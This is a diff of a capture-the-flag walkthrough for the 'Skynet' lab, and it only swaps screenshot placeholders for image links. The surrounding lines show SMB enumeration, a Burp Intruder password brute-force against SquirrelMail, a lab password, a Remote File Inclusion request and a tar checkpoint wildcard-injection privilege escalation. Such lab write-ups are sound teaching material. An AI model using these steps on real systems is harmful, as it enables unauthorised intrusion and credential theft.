@@ -12,7 +12,7 @@ _Enumerate Samba_
 nmap -sV IP
 ```
 
-[SCREEN01]
+<img width="722" height="341" alt="SCREEN01" src="https://github.com/user-attachments/assets/f0267a55-f373-4b22-b31a-56c59f5ee766" />
 
 2. List available SMB shares without authentication. Access the anonymous share to retrieve files. The `logs/log1.txt` file contains a list of potential passwords. The target username is identified as `milesdyson`.
 
@@ -25,7 +25,7 @@ cd logs
 mget *
 ```
 
-[SCREEN02]
+<img width="698" height="159" alt="SCREEN02" src="https://github.com/user-attachments/assets/7627b016-abe5-4c0f-b7ad-b85de19258ad" />
 
 3. Enumerate web directories to identify additional attack vectors
    - This reveals the SquirrelMail login interface at `/squirrelmail/`
@@ -34,7 +34,7 @@ mget *
 gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-[SCREEN03]
+<img width="722" height="414" alt="SCREEN03" src="https://github.com/user-attachments/assets/46f4cb53-e22a-4e24-87a6-ce0c08a7dc63" />
 
 4. Capture the login request from `http://IP/squirrelmail/src/login.php` via burp suite. Send it to the intruder, load the log1.txt password list and begin attack. Search for shortest response
 
@@ -48,9 +48,9 @@ gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-
   - Attack type: Sniper
 - Execute the attack and identify successful authentication by analyzing response lengths. The shortest response typically indicates successful authentication.
 
-[SCREEN04]
+<img width="1358" height="805" alt="SCREEN04" src="https://github.com/user-attachments/assets/8551cc5b-1b5e-4b2e-84cc-36ef904ba80c" />
 
-[SCREEN05]
+<img width="1211" height="741" alt="SCREEN05" src="https://github.com/user-attachments/assets/0df0f3ba-aa57-4b38-82bd-6c73e6297bf7" />
 
 ---
 
@@ -60,7 +60,7 @@ gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-
 
 - Password: **)s{A&2Z=F^n_E.B`**
 
-[SCREEN06]
+<img width="888" height="314" alt="SCREEN06" src="https://github.com/user-attachments/assets/c0caa15e-287d-4669-a4e7-b9f6a59f7baf" />
 
 2. Use the discovered credentials to access Miles Dyson's private SMB share. Navigate to the notes directory and retrieve important file
 
@@ -70,7 +70,7 @@ cd notes
 get important.txt
 ```
 
-[SCREEN07]
+<img width="647" height="113" alt="SCREEN07" src="https://github.com/user-attachments/assets/e96cbf17-27fb-4fc2-8de3-20f0f9736f4d" />
 
 ---
 
@@ -88,7 +88,7 @@ get important.txt
 gobuster dir -u http://IP/45kra24zxs28v3yd/ -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-[SCREEN08]
+<img width="716" height="416" alt="SCREEN08" src="https://github.com/user-attachments/assets/73d2f5e5-88e9-4b9a-b0c4-67933629f41c" />
 
 2. Further enumeration reveals a vulnerable endpoint `http://<TARGET_IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php`. This endpoint is susceptible to Remote File Inclusion via the `urlConfig` parameter
 
@@ -125,7 +125,7 @@ curl "http://IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlCo
 cat /home/milesdyson/user.txt
 ```
 
-[SCREEN09]
+<img width="720" height="340" alt="SCREEN09" src="https://github.com/user-attachments/assets/642d77fe-edf0-4a51-9c5f-1e3841715e15" />
 
 ---
 
@@ -149,3 +149,5 @@ echo "" > --checkpoint=1
 ls /root
 cat /root/root.txt
 ```
+
+<img width="433" height="143" alt="SCREEN10" src="https://github.com/user-attachments/assets/ddf5b470-e4c1-483d-85f0-9bf2bf0108e9" />
